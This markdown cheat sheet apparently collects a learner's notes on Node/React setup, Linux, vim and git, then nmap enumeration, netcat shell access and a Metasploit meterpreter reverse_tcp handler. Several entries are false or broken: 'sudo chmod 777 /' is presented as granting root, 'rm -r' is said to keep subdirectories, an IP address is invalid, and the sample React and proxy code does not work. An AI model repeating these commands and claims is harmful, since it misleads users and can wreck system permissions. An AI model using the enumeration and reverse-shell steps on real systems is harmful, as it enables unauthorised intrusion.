### STEP 1: SPIN A LIVE SERVER
```bash
root@omarbelkady:~$ http-server ./NAMEOFDIR -p PORTNUM
```
### STEP 2A: Long List of all the processes running on your local machine
```bash
root@omarbelkady:~$ lsof -i -ll
```
### STEP 2A: Long List of all the processes running on your local machine if you use npm
```bash
root@omarbelkady:~$ ps -e|grep node
```

### STEP 3: Make sure to kill the process after use to be able to use it again
```bash
root@omarbelkady:~$ kill -9 -PROCESSID
```
### STEP 3A: If multiple processes are running instead of manually doing it one by one you can kill the processes in one line
```bash
root@omarbelkady: ~$ kill -9 -PROCESSID1 -PROCESSID2 -PROCESSIDETC.
```

### HOW TO CREATE A Package.JSON File
```bash
root@omarbelkady: ~$ npm init
```



### HOW TO CONNECT A BE+FE
```
STEP 0: NAME YOUR PROJECT
STEP 1: CREATE 2 DIRS(BE,FE)
A: WE NEED BE TO MAKE HTTP Req to THE BE FROM THE FE, WE NEED BE BECAUSE THIS WILL BLUR THE CREDENTIALS WHEN SUBMITTED
B: CONNECT TO MY DB SEND AN HTTP REQ FROM FE TO BE TO QUERY THE DB
C: FE RENDERS ON CLI-SID
STEP 2: cd BE/
STEP 3: npm init and press enter continuously to create the package.json file
STEP 4: npm i express --save
STEP 5: CREATE A BACKEND SERVER
STEP 6: Create a new file called App.js
	NOTE: REACT RUNS ON 3000 and make sure Express doesn't run on the same portREMEMBER
```	
```js
const express = require("express");
var request = require("request");
const app = express();
const port = 5000;

app.get("/", (req,res) => res.send("BLABLABLA"));// this is an endpoind which we can test on POSTMAN
app.get("/nelanEndPoint",(req,res) => res.send("This is the endpoint I will test on Postman"));
app.get("/getWeatherRabat",(req,res) => {
	//Make an http request to the URL google
	request(
		"http://api.apixu.com/v1/current.json?key=36272f88f57b49d9b0d04252191905&q=Rabat",
		function(error, response, body){
			if(!error && response.statusCode==200){
				var parseBody=JSON.parse(body);
				var temp_c = parseBody['current']['temp_c'];
				//Sending it as a map
				res.send({temp_c});
			}
		}
	);
});
app.listen(port, () => console.log('This app is listening on port ${port}!'));
```

```
IF I were to make an HTTP Request I would get a response back of BLABLABLA
STEP 6: cd BE/
STEP 7: node app.js
STEP 8: npm i request --save
```
### FE PART
```console
root@omarbelkady: ~$ create-react-app FE
root@omarbelkady: ~$ cd FE
root@omarbelkady: ~$ npm start
```

STEP 9: Create the Weather.js file

```js
import React, {Component} from 'react';

export default class Weather extends Component{
//Creating the state
constructor(){
	super()
	this.state={
		weather: "Not yet Gotten"
	};
}
			
//Test the http request FE to our BE
//Before doing this install the package by doing this: npm i axios --save
handleButtonClick = () =>{
	axios.get("/getWeathermorocco").then(response =>{
	//setting the state to it
		this.setState({
			weather: response.data.temp_c	
		});
	});
};

	render(){
		return{	
			<div>
			<!-- Adding the on button click handler-->
			<button onClick={this.handleButtonClick}>Get Weather in Morocco</button>
			<h1>The Weather in Morocco is: {this.state.weather} </h1>
			</div>
		}
	}
}
```

	
App.js
```js
import React from "react";
import Weather from "./Weather";
import "./App.css";

function App()
{
	return(
		<div className="App">
		<header className="App-header">
			<Weather />
			</header>
			</div>
	);
}

export default App;
```

### HOW TO LINK FE+BE
```
GOTO package.json
add a var called
"proxy" give the key a value the port the backend was running on "http://localhost:5000/"
should look like this
"proxy":"http://localhost:500"
```

### ARCHITECTURE OF A #PAGE WEBSITE
```
1- NAME YOUR DEFAULT PAGE INDEX.HTML CHANGE IT TO INDEX.PHP
2- ANY OTHER PAGE SHOULD NAME_OF_PAGE.PHP
3- HAVE AN INCLUDES FOLDER
4- HAVE A THEME FOLDER
5- HAVE js folder
6- HAVE an img folder
7- YOUR MAIN PAGE SHOULD BE index.php
8- OPEN THE FILES IN THE INCLUDES FOLDER ALONG WITH YOUR INDEX.PHP FILE
9- to pipe the scripts of the style change the head tags to this:
```
### HOW TO CHANGE FROM IMPORT PAGE INTO NEW INDEX.PHP include the head.php which is in the includes dir
```php
<head>
	<?php include 'includes/head.php';?>
</head>
```




### HOW TO DEPLOY LIVE SERVER ON MY MACHINE
[![Screenshot-2020-08-03-at-3-47-03-AM.png](https://i.postimg.cc/0jqPVgdN/Screenshot-2020-08-03-at-3-47-03-AM.png)](https://postimg.cc/KkQ6YHWX)
[![Screenshot-2020-08-03-at-3-47-17-AM.png](https://i.postimg.cc/G2FZh4Gc/Screenshot-2020-08-03-at-3-47-17-AM.png)](https://postimg.cc/S2KZgNg5)


#### Vim
```
$ v ==> Copy the character
$ V ==> Copy the entire line
Move the cursor to the end where you want to cut
$ d ==> Cuts till that point
$ y ==> Copy
$ P ==> Paste before the cursor
$ p ==> Paste after the cursor
$ :set number ==> display line number
$ :w ==> write to the file
$ i ==> toggle insert/command mode
$ /abc ==> Searching for the abc
```

### show the files in the working directory
```console
root@omarbelkady:~$ ls
```

### show all the files in the working directory including the hidden files
```console
root@omarbelkady:~$ ls -la
```

### show all the files in the working directory with their permissions in a long list format
```console
root@omarbelkady:~$ ls -ll
```

### show all the files in the working directory with their permissions in a long list format in sorted order by date:time
```console
root@omarbelkady: ~$ ls -ll -t
```


### Stop an existing process
```console
root@omarbelkady:~$ kill
```

### create a directory
```console
root@omarbelkady:~$ mkdir <nameOfDir>
```

### remove a filled directory but keep the subdirectories
```console
root@omarbelkady:~$ rm -r <nameOfDir>
```

### remove a filled directory and the subdirectories
```console
root@omarbelkady:~$ rm -rf <nameOfDir>
```

### Move a directory with its contents to another location
```console
root@omarbelkady:~$ mv -v <ORIGINALPATH> <DESTINATIONPATH>
```


### print working directory
```console
root@omarbelkady:~$ pwd
```

### Change directory to home 
```console
root@omarbelkady:~$ cd ~
```
### List all the packages installed navigate to usr and change your directory to the bin folder and list all the files
```console
root@omarbelkady: ~$ cd ~
root@omarbelkady: ~$ cd ..
root@omarbelkady: ~$ cd bin/
root@omarbelkady: ~$ ls
```

### Give root privelleges to for current user
```console
root@omarbelkady: ~$ sudo chmod 777 /
```
### Change directory to root
```console
root@omarbelkady: ~$ cd /
```


### go up 1 directory
```console
root@omarbelkady:~$ cd .. 
```

### go back 2 directories
```console
root@omarbelkady:~$ cd ../.. 
```

### Shows the current authenticated user 
```bash
root@omarbelkady:~$ whoami
```

### echo
Prints..... 
```bash
root@omarbelkady:~$ echo "Nelan 56837 6342"
```

### alias
Map a command to another command
```bash
root@omarbelkady:~$ alias home='cd ~'
root@omarbelkady:~$ alias ll='ls -al'
root@omarbelkady:~$ alias root='cd /'
```

### go forward between one word to the next word in your command
alt+f

### go backward between one word to the next word in your command
alt+b

### cancels current command
ctrl+c

### creates a 2nd shell side by side
ctrl+d

### creates a 2nd shell below not to the side
cmd+shift+d

### autocomplete
tab

### displays current date
```bash
root@omarbelkady:~$ date
```

### displays calendar
```bash
root@omarbelkady:~$ cal
```

###  displays calendar for the 2020 year
```bash
root@omarbelkady:~$ cal 2020
```

### displays manual for all the possible commands you can run
```bash
root@omarbelkady:~$ man
```

### execute the file
```bash
root@omarbelkady:~$ ./
```

### Find A file
```bash
root@omarbelkady:~$ find /full/path/here/ "PatternOrDIRNAME" 
```

### install the tree command within the terminal- THIS IS A MAC EXCLUSIVE
```bash
root@omarbelkady:~$ brew install tree 
```

### create a file
```bash
root@omarbelkady:~$ touch [filename]
```

### Copy
```bash
root@omarbelkady:~$ cp *.txt [pathtothedirectory]
```

### copy all the files with the specified extension ino the examples directory
```bash
root@omarbelkady:~$ cp *.extension examples
```

### Example: I am copying all the executable(.exe) files within my working directory into the examples directory
```bash
root@omarbelkady:~$ cp *.exe examples
```

### Run a Recursive search in a directory for a specific string 
```bash
root@omarbelkady:~$ grep -r "END" examples
```

The above command will run a recursive search in my examples directory for any file that has the word END in it

### Display all the commands committed as history
```bash
root@omarbelkady:~$ history | grep "grep" 
```

### To run a command in history
```bash
root@omarbelkady:~$ ![historyNumber]
```

### Change the file permission or as written change access modes
```bash
root@omarbelkady:~$ chmod [permission] [fileName]
```

### Display all the ip and mac addresses within your network in a table structure
```bash
root@omarbelkady:~$ arp -a
```

### How to find your mac address
```bash
root@omarbelkady:~$ ifconfig
```

### Display Your mac address
```bash
root@omarbelkady:~$ macchanger -s eth0
```

### Random Mac Address Setter
```bash
root@omarbelkady:~$ macchanger -r eth0
```

### Sorted order of your mac address
```console
root@omarbelkady:~$ ifconfig | grep ether
```

### How to know which command you can run on the specific file
```console
root@omarbelkady:~$ cat [nameOfFile]
```

### Reboot From the Terminal
```console
root@omarbelkady:~$ reboot
```

### Kill all Subprocesses
```console
root@omarbelkady:~$ airmon-ng check kill
```
### Download an image from the terminal and pipe it with a specific name of your choice
```bash
root@omarbelkady: ~$ curl url/nameofimage.jpg > nameYouWishToCallYourImage.jpg
```


## DNS Enumeration AND ZONE Transfer we must use port 53 for ZT
```bash
nmap -p 53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=targer-url
```

If NO Ping 
```bash
nmap -Pn -p 53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=target-url
```

### SERVER HOW TO PERFORM ZONE TRANSFER
```bash
nmap --script dns-zons-transfer --script-args dns-zone-transfer.server=NAMEOFSERVERDNS, dns-zone-transfer.port=#, dns-zone-transfer.domain=DOMAINADDRESS
```
Enumerates Mail Servers, DNS Changes

## -----------END OF DNS ENUMERATION-------------


## NMAP ENUMERATION FTP

### OS Scanning
```bash
nmap -O <targetIP>
```

### Most Popular Port Scan I am scanning the 20 most popular ports in the network
```bash
nmap --top-ports 20 <TargetIP>
```

### Host Scan
```bash
nmap -sp <TARGET_IP>
```

### Ouput Nmap Results to TXT file
```bash
nmap --top-port 20 <TARGET_IP> -oN nmapresu.txt
```

### Banner Grabbing using Nmap Aggressive Scan(T4) T stands for Timing Template
```bash
sudo nmap -F -T4 --script nameOfScript TargetIP
```


### display a list of ftp scripts
```bash
ls -al /usr/share/nmap/scripts | grep -e "ftp"
```

The ftp-anon.nse is a script used to perform anonymous ftp logins and very efficient in ctf
The ftp-brute.nse is a script used to perform a brute force attack. Do not use nmap as a brute force utility it is recommended to use hydra.
ftp-proftpd-backdoor.nse is very similar to ftp-vsftpd-backdoor.nse in that the two of the scripts are intrusive. They directly interact with the target.


To perform a service version scan on port 21. 
metasploitable 2 runs on 1.149
metasploitable 3 runs on 1.38
```bash
nmap -sV -p 21 192.168.1.149 192.168.1.38
```

If vsftpd 2.3.4 is running this means I must run the vsftpd backdoor which is metasploitable2 in addition if Microsoft Ftpd is running this means I must run the appropriate script. The most essential script we must run is the ftp-anon-nse script.

### script that displays system info of the target
```
ftp-syst.nse
```

I run a stealth Scan to enumerate potential paths and list any vulns
``` bash
sudo nmap -p 22 -sS --script ftp-anon, ftp-syst,tftp-enum, ftp-vsftpd-backdoor 21 192.168.1.149 192.168.1.38
```

This will tell us whether Anonymous FTP Login is allowed, whether FTP Server status(connected, logged in, disconnected), TYPE and Session Timeout. It will tell us whether or not there is a backdoor and whether or not the backdoor is exploitable. Whether or not the backdoor will give us root access.

Another Enumeration Step:
ftp://192.168.1.149

SMTP runs on many many servers. Why perform enumeration on the SMTP port? What info is obtained. SMTP runs by default on port 25. But it can be configured to run on different port. If SMTP service is badly configured we can enumerate user accounts. If there is an open relay we can use this to bypass authentication and then we send mails.

### List all the nmap script to do with smtp
``` bash
6342_56837@ubuntu:~$ ls -al /usr/share/nmap/scripts/ | grep -e "smtp"
```
### SMTP
```
SMTP Command and run on port 25 to enumerate users on the system and we check if vrfy is listed which means it verifies whether a particular mail box exists on the system. Depending on the response from the system we obtain the user's mailbox and user's username.  This can trace the path for us to use BF and then we use SSH/Telnet to gain access.
```
### SMTP Example
```bash
6342_56837@ubuntu:~$ nmap -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY} [targetIP]
```

```bash
6342_56837@ubuntu:~$ nmap -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY} 192.168.1.325
```

```bash
2526_56837_2@ubuntu: ~$ sudo nmap -p25 --script smtp-commands 192.168.1.217
```


### SMTP Open Relay Script Used to Bypass Auth
```bash
2526_56837_2@ubuntu: ~$ nmap -p25 --script smtp-open-relay 192.168.1.217
```

### SMTP Vulnerability Scan
```bash
2526_56837_2@ubuntu: ~$ nmap -p25 --script smtp-vuln-cve2011-1720 192.168.1.217
```


## Git

### How To Clone A directory
```bash
root@omarbelkady:~$ git clone <url> 
``` 

## Continuous Workflow

### 1- Get the latest version of your project
```bash
root@omarbelkady:~$ git pull origin <nameOfBranch>
```

### Create New Branch LOCALLY 2)-- SKIP THIS STEP IF BRANCH EXISTS
```bash
root@omarbelkady:~$ git checkout -b <nameOfNewBranch>
```

### Get your local branch meaning what you have in your machine to agree with your remote branch(branch on GitHub) usually master IF YOU ARE PM
```bash
root@omarbelkady:~$ git push origin <nameOfBranch>
```

### Goto a different branch
```bash
root@omarbelkady:~$ git checkout <nameofBranch>
```

### Delete the local branch(branch on your local machine aka computer)
```bash
root@omarbelkady:~$ git branch -d <nameOfBranch>
```

### Steps To Create A New Project

#### 1- Initialize An Empty Repository
```bash
root@omarbelkady:~$ git init
```
### 1a- Initialize An Empty Repository using curl Command
```bash
root@omarbelkady:~$ curl -u "usernameGOESHERE" https://api.github.com/user/repos -d '{"name":"NAMEYOUWANTTOGIVETOYOURREPO"}'
```

#### 2- Add all the files to be staged
```bash
root@omarbelkady:~$ git add .
```

### 2a - If you made a mistake in Step 2 and wish to remove a file from staging
```bash
root@omarbelkady: ~$ git restore --stage pathOfFile
```

#### 3- Commit the files use -m to be respectful to your peers to log what you are doing
```bash
root@omarbelkady:~$ git commit -m "A overall description of what you just modified"
```

#### 4- Do not forget to link your local repository to the remote repository
```bash
root@omarbelkady:~$ git remote add origin <urlOfRepo>
```

#### 5- Push to the repository
```bash
root@omarbelkady:~$ git push origin <NameOfBranch>
```

### Branching and Merging

#### Show a list of all the branches a * next to a branch means the branch you are on
```bash
root@omarbelkady:~$ git branch
```

#### IF you are in a group ALWAYS PULL THEN PUSH. In this case I am pulling from the remote Branch Everything from the repo Linux
```bash
root@omarbelkady:~$ git pull origin . Linux
```

#### If you are working on a feature and your friend is working on another feature and your pm tells you we need both your work now in the features repository
```bash
root@omarbelkady:~$ git merge features
```

#### Rename a branch
```bash
root@omarbelkady:~$ git branch -m <OLD> <NEW>
```

#### To rename say, for example omar which I am currently working on
```bash
root@omarbelkady:~$ git branch -m ramo
```


#### How To Delete Project
##### 1- Delete The Local branch
```bash
root@omarbelkady:~$ git branch -d <nameofBranch>
```

##### 2- Delete The Remote branch
```bash
root@omarbelkady:~$ git push origin :<nameofBranch>
```

##### 3- Sync your local changes with your remote changes
```bash
root@omarbelkady:~$ git pull origin master
```


### Comparing Revisions
#### Show the difference between master branch(locally) and master branch(remote-GitHub)
```bash
root@omarbelkady:~$ git diff origin..master
```

#### Show the difference between work that has been committed and not been committed
```bash
root@omarbelkady:~$ git diff --stat HEAD
```

### Privellege Escalation
#### Step 1: launch Apache web server
~~~
# service apache2 status
~~~
```bash
root@omarbelkady:~$ nmap -sT 192.168.1.27 4444
```

#### Step 2: Check if port 4444 opened
```bash
root@omarbelkady:~$ netstat -an | find "4444"
```
#### Step 3: Check if port 4444 opened
```bash
root@omarbelkady:~$ nmap -sT 192.168.1.27
```

#### Step 4: Gain Access

```bash
root@omarbelkady:~$ nc 192.168.1.27 4444
```

#### Step 5: List Directories
```bash
root@omarbelkady:~$ dir
```

#### Step 6: List the system details
```bash
root@omarbelkady:~$ systeminfo
```

#### Step 7: Find the hostname
```bash
root@omarbelkady:~$ hostname
```

#### Step 8: Find the users in the environment
```bash
root@omarbelkady:~$ net users
```

#### Step 8 a: Find the ip address of everyone
```bash
root@omarbelkady:~$ ipconfig/all
```

#### Step 9: Detect systems in the environment
```bash
root@omarbelkady:~$ route print
```

#### Step 10: Search for vulnerable devices
```bash
root@omarbelkady:~$ netstat -ano
```

#### Step 11: Search for open ports that are enabled
```bash
root@omarbelkady:~$ netsh firewall show state
```



#### FINDING THE IP ADDRESS OF A TARGET WHOM YOU WANT TO SET A REV CONNCECITON
```bash
root@blaba: ~$ netstat –an
```

## Metasploit
### WAY N1
#### STEP1
```
set RHOSTS # 
```

#### STEP 2
```
set RPORT #
```

#### STEP 3: Root User
```
set USERNAME root
```

#### STEP 4: start scan
```
run
```

#### STEP 5: exploit
```
exploit
```

### WAY N2[CORRECT WAY]
```
use multi/handler
```

```
set payload windows/meterpreter/reverse_tcp
```

```
set LHOST 192.XXX.X.XXX
```

```
set LPORT XXXX
```

```
exploit
```
